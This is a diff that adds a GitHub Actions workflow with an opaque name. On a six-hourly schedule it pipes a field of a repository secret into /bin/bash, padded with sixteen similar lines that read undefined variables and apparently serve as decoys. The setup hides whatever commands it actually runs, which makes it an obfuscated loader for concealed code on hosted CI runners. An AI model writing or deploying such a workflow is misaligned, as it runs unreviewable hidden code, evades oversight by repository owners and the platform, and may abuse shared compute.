@@ -1,0 +1,33 @@
+name: zhuadaowodeshouxinn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuadaowodeshouxinn
+        env:
+          uh0: ${{ secrets.uh0 }}
+        run: |
+          echo $uh0 | jq -r .n730 | /bin/bash
+          echo $orm4850 | jq -r .z245 | /bin/bash
+          echo $thsn7 | jq -r .a9356 | /bin/bash
+          echo $xwh56706 | jq -r .dst61 | /bin/bash
+          echo $bhtj2 | jq -r .djoz1 | /bin/bash
+          echo $xlcoh72 | jq -r .yqti931 | /bin/bash
+          echo $ua8128 | jq -r .s05531 | /bin/bash
+          echo $yci59 | jq -r .qmgyw2 | /bin/bash
+          echo $oxur1 | jq -r .arva73 | /bin/bash
+          echo $dww04 | jq -r .kqgt7 | /bin/bash
+          echo $hthv6400 | jq -r .e53072 | /bin/bash
+          echo $qz38 | jq -r .pldz901 | /bin/bash
+          echo $wgbp731 | jq -r .awcx38 | /bin/bash
+          echo $qdfqm021 | jq -r .ld15616 | /bin/bash
+          echo $cxjel2 | jq -r .kfwc39 | /bin/bash
+          echo $k3 | jq -r .jevuv2 | /bin/bash
+          echo $muel52054 | jq -r .j62 | /bin/bash
+
